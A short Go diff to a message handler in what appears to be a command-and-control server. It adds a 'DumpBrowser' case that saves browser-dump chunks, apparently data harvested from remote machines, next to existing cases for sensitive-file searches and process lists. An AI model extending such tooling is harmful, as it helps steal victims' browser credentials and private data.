@@ -641,6 +641,9 @@ func handleOtherMsg(msg []byte) error {
 	case command.SearchSensitive:
 		database.SaveSensitiveChunk(uid, string(data))
 
+	case command.DumpBrowser:
+		database.SaveDumpBrowserChunk(uid, "", "", string(data))
+
 	case command.PS:
 		if len(data) > 0 {
 			command.VarPidQueue.Add(uid, string(data))
